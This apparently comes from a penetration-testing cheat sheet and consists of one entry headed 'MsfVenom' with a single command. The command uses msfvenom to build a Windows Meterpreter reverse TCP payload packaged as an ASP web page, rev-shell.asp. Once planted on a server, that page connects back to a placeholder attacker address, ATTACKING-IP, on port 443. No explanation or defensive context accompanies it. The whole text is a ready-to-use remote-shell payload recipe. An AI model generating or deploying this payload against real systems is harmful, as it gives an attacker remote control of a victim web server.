### MsfVenom 
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKING-IP LPORT=443 -f asp > rev-shell.asp
```

